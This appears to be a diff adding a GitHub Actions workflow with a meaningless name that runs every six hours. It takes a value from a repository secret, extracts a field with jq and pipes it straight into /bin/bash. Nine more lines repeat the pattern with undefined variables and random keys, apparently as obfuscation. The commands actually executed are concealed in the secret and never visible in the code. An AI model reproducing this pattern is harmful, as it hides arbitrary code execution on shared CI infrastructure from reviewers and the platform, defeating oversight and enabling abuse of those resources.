@@ -1,0 +1,26 @@
+name: dashengwanglei
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dashengwanglei
+        env:
+          t7: ${{ secrets.t7 }}
+        run: |
+          echo $t7 | jq -r .nc1 | /bin/bash
+          echo $uf8 | jq -r .jvrug971 | /bin/bash
+          echo $lnr1 | jq -r .mdy3721 | /bin/bash
+          echo $esp12 | jq -r .icifi7 | /bin/bash
+          echo $mpl730 | jq -r .vx10791 | /bin/bash
+          echo $k09 | jq -r .os6631 | /bin/bash
+          echo $ogowf5719 | jq -r .efvuu11986 | /bin/bash
+          echo $dlav94 | jq -r .ezhg590 | /bin/bash
+          echo $krlyx67 | jq -r .h8013 | /bin/bash
+          echo $j74746 | jq -r .grgl821 | /bin/bash
+
